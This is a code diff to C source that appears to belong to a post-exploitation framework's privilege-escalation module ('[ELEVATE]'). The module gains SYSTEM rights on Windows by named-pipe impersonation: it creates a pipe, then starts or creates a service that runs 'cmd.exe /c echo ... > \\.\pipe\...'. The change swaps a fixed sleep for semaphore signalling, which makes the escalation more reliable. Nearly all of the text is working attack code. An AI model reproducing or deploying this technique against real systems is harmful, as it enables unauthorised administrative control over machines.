@@ -11,6 +11,7 @@ DWORD THREADCALL elevate_namedpipe_thread( THREAD * thread )
 	DWORD dwResult              = ERROR_ACCESS_DENIED;
 	HANDLE hServerPipe          = NULL;
 	HANDLE hToken               = NULL;
+	HANDLE hSem					= NULL;
 	char * cpServicePipe        = NULL;
 	Remote * remote             = NULL;
 	BYTE bMessage[128]          = {0};
@@ -23,6 +24,7 @@ DWORD THREADCALL elevate_namedpipe_thread( THREAD * thread )
 
 		cpServicePipe = (char *)thread->parameter1;
 		remote        = (Remote *)thread->parameter2;
+		hSem		  = (HANDLE)thread->parameter3;
 
 		if( !cpServicePipe || !remote )
 			BREAK_WITH_ERROR( "[ELEVATE] elevate_namedpipe_thread. invalid thread arguments", ERROR_BAD_ARGUMENTS );
@@ -39,6 +41,10 @@ DWORD THREADCALL elevate_namedpipe_thread( THREAD * thread )
 			if( event_poll( thread->sigterm, 0 ) )
 				BREAK_WITH_ERROR( "[ELEVATE] elevate_namedpipe_thread. thread->sigterm received", ERROR_DBG_TERMINATE_THREAD );
 
+			//signal the client that the pipe is ready
+			if ( !ReleaseSemaphore( hSem, 1, NULL ) )
+				BREAK_WITH_ERROR( "[ELEVATE] elevate_namedpipe_thread. ReleaseSemaphore failed", ERROR_DBG_TERMINATE_THREAD );
+			
 			// wait for a client to connect to our named pipe...
 			if( !ConnectNamedPipe( hServerPipe, NULL ) )
 			{
@@ -94,6 +100,7 @@ DWORD elevate_via_service_namedpipe( Remote * remote, Packet * packet )
 	DWORD dwResult              = ERROR_SUCCESS;
 	char * cpServiceName        = NULL;
 	THREAD * pThread            = NULL;
+	HANDLE hSem					= NULL;
 	char cServiceArgs[MAX_PATH] = {0};
 	char cServicePipe[MAX_PATH] = {0};
 	OSVERSIONINFO os            = {0};
@@ -119,16 +126,20 @@ DWORD elevate_via_service_namedpipe( Remote * remote, Packet * packet )
 		_snprintf_s( cServicePipe, sizeof(cServicePipe), MAX_PATH, "\\\\.\\pipe\\%s", cpServiceName );
 		
 		_snprintf_s( cServiceArgs, sizeof(cServiceArgs), MAX_PATH, "cmd.exe /c echo %s > %s", cpServiceName, cServicePipe );
-
-		pThread = thread_create( elevate_namedpipe_thread, &cServicePipe, remote, NULL );
+		hSem = CreateSemaphore( NULL, 0, 1, NULL );
+		if (!hSem) 
+			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe. CreateSemaphore failed", ERROR_INVALID_HANDLE );
+		pThread = thread_create( elevate_namedpipe_thread, &cServicePipe, remote, hSem );
 		if( !pThread )
 			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe. thread_create failed", ERROR_INVALID_HANDLE );
 
 		if( !thread_run( pThread ) )
 			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe. thread_run failed", ERROR_ACCESS_DENIED );
 
-		Sleep( 500 ); // to-do: use signals to synchronize when the named pipe server is ready...
-
+		//wait for the thread to create the pipe(if it times out terminate)
+		if ( WaitForSingleObject( hSem, 500 ) != WAIT_OBJECT_0 )
+			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe. WaitForSingleObject failed", ERROR_ACCESS_DENIED );
+		
 		// start the elevator service (if it doesnt start first time we need to create it and then start it).
 		if( service_start( cpServiceName ) != ERROR_SUCCESS )
 		{
@@ -159,6 +170,8 @@ DWORD elevate_via_service_namedpipe( Remote * remote, Packet * packet )
 
 	if( pThread )
 		thread_destroy( pThread );
+	if ( hSem )
+		CloseHandle( hSem );
 
 	return dwResult;
 }
@@ -175,6 +188,7 @@ DWORD elevate_via_service_namedpipe2( Remote * remote, Packet * packet )
 	DWORD dwResult              = ERROR_SUCCESS;
 	THREAD * pThread            = NULL;
 	HANDLE hServiceFile         = NULL;
+	HANDLE hSem					= NULL;
 	LPVOID lpServiceBuffer      = NULL;
 	char * cpServiceName        = NULL;
 	THREAD * pthread            = NULL;
@@ -224,14 +238,20 @@ DWORD elevate_via_service_namedpipe2( Remote * remote, Packet * packet )
 		if( dwTotal != dwServiceLength )
 			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. WriteFile hServiceFile failed", ERROR_BAD_LENGTH );
 
-		pThread = thread_create( elevate_namedpipe_thread, &cServicePipe, remote, NULL );
+		hSem = CreateSemaphore(NULL, 0, 1, NULL);
+		if (!hSem)
+			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. CreateSemaphore failed", ERROR_INVALID_HANDLE);
+
+		pThread = thread_create( elevate_namedpipe_thread, &cServicePipe, remote, hSem );
 		if( !pThread )
 			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. thread_create failed", ERROR_INVALID_HANDLE );
 
 		if( !thread_run( pThread ) )
 			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. thread_create failed", ERROR_ACCESS_DENIED );
 
-		Sleep( 500 );
+		//wait for the thread to create the pipe(if it times out terminate)
+		if ( WaitForSingleObject( hSem, 500 ) != WAIT_OBJECT_0 )
+			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. WaitForSingleObject failed", ERROR_ACCESS_DENIED);
 
 		// start the elevator service (if it doesnt start first time we need to create it and then start it).
 		if( service_start( cpServiceName ) != ERROR_SUCCESS )
@@ -274,6 +294,9 @@ DWORD elevate_via_service_namedpipe2( Remote * remote, Packet * packet )
 
 	if( pThread )
 		thread_destroy( pThread );
+
+	if ( hSem )
+		CloseHandle( hSem );
 
 	return dwResult;
 }
